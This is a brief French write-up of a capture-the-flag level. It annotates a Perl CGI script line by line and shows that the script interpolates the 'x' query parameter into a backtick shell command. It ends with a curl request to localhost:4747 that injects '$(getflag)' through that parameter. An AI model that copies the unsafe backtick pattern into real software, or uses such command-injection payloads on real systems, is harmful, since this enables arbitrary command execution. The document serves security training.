On voit un fichier perl => level04.pl:
    #!/usr/bin/perl shebang
    # localhost:4747 nous dit que ce script tourne sur le port 4747
    use CGI qw{param}; import de la lib CGI param qui permet de recuperer des parametre
    print "Content-type: text/html\n\n"; 
    sub x { subroutine => "fonction" qui recupere le premier parametre et le passe a $y
      $y = $_[0];
      print `echo $y 2>&1`; execute la commande echo
    }
    x(param("x")); appelle la subroutine x avec le parametre x

on peut definir x:
    curl 'localhost:4747/?x=$(getflag)'
